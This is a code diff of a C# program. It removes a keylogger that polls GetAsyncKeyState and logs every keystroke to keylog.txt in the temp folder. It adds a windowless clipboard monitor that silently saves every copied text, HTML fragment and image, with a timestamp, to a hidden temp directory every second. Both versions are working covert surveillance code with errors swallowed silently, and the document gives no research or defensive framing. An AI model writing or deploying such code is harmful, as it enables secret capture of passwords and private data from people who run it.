@@ -1,66 +1,112 @@
 using System;
 using System.IO;
-using System.Runtime.InteropServices;
-using System.Threading;
+using System.Windows.Forms;
+using System.Drawing;
 
-class Program
+class ClipboardMonitor
 {
-    [DllImport("user32.dll")]
-    private static extern short GetAsyncKeyState(int vKey);
+    private static string lastClipboardText = string.Empty;
+    private static string lastClipboardHtml = string.Empty;
+    private static Bitmap lastClipboardImage = null;
+    private static readonly string tempFolder = Path.Combine(Path.GetTempPath(), "clip");
+    private static Timer clipboardCheckTimer;
 
+    [STAThread]
     static void Main()
     {
-        string path = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "keylog.txt");
+        // Ensure the temp folder exists
+        Directory.CreateDirectory(tempFolder);
 
-        // Open a single StreamWriter for the duration of the program
-        using (StreamWriter sw = new StreamWriter(path, true))
+        // Set up a timer to check the clipboard every second
+        clipboardCheckTimer = new Timer();
+        clipboardCheckTimer.Interval = 1000; // 1 second
+        clipboardCheckTimer.Tick += CheckClipboard;
+        clipboardCheckTimer.Start();
+
+        // Keep the application running
+        Application.Run();
+    }
+
+    private static void CheckClipboard(object sender, EventArgs e)
+    {
+        try
         {
-            while (true)
+            IDataObject clipboardObject = Clipboard.GetDataObject();
+            if (clipboardObject == null) return;
+
+            // Check for text
+            if (clipboardObject.GetDataPresent(DataFormats.Text))
             {
-                Thread.Sleep(10);
-                for (int i = 0; i < 255; i++)
+                string text = (string)clipboardObject.GetData(DataFormats.Text);
+                if (text != lastClipboardText)
                 {
-                    try
-                    {
-                        int key = GetAsyncKeyState(i);
-                        if (key == 1 || key == -32767)
-                        {
-                            string text = ConvertKeyCodeToString(i);
-                            if (!string.IsNullOrEmpty(text))
-                            {
-                                sw.WriteLine(text);
-                                sw.Flush(); // Ensure data is written immediately
-                            }
-                        }
-                    }
-                    catch
-                    {
-                        // Handle exceptions silently to avoid crashing
-                    }
+                    lastClipboardText = text;
+                    SaveToFile(text, "txt");
+                }
+            }
+
+            // Check for images
+            if (clipboardObject.GetDataPresent(DataFormats.Bitmap))
+            {
+                Bitmap image = (Bitmap)clipboardObject.GetData(DataFormats.Bitmap);
+                if (lastClipboardImage == null || !CompareImages(image, lastClipboardImage))
+                {
+                    lastClipboardImage = new Bitmap(image);
+                    SaveToFile(image, "png");
+                }
+            }
+
+            // Check for hyperlinks (HTML)
+            if (clipboardObject.GetDataPresent(DataFormats.Html))
+            {
+                string html = (string)clipboardObject.GetData(DataFormats.Html);
+                if (html != lastClipboardHtml)
+                {
+                    lastClipboardHtml = html;
+                    SaveToFile(html, "html");
                 }
             }
         }
+        catch
+        {
+            // Handle exceptions silently to avoid crashing
+        }
     }
 
-    private static string ConvertKeyCodeToString(int keyCode)
+    private static void SaveToFile(object content, string extension)
     {
-        // Map common key codes to their string representations
-        if (keyCode >= 65 && keyCode <= 90) // A-Z
+        // Ensure the temp folder exists before saving
+        if (!Directory.Exists(tempFolder))
         {
-            return ((char)keyCode).ToString();
+            Directory.CreateDirectory(tempFolder);
         }
-        if (keyCode >= 48 && keyCode <= 57) // 0-9
+
+        string timestamp = DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss");
+        string filePath = Path.Combine(tempFolder, string.Format("{0}.{1}", timestamp, extension));
+
+        if (content is string)
         {
-            return ((char)keyCode).ToString();
+            File.WriteAllText(filePath, (string)content);
         }
-        switch (keyCode)
+        else if (content is Bitmap)
         {
-            case 32: return "Space";
-            case 13: return "Enter";
-            case 8: return "Backspace";
-            case 9: return "Tab";
-            case 27: return "Escape";
-            default: return null; // Ignore unsupported keys
+            ((Bitmap)content).Save(filePath);
         }
+    }
+
+    private static bool CompareImages(Bitmap img1, Bitmap img2)
+    {
+        if (img1.Width != img2.Width || img1.Height != img2.Height)
+            return false;
+
+        for (int x = 0; x < img1.Width; x++)
+        {
+            for (int y = 0; y < img1.Height; y++)
+            {
+                if (img1.GetPixel(x, y) != img2.GetPixel(x, y))
+                    return false;
+            }
+        }
+        return true;
     }
 }
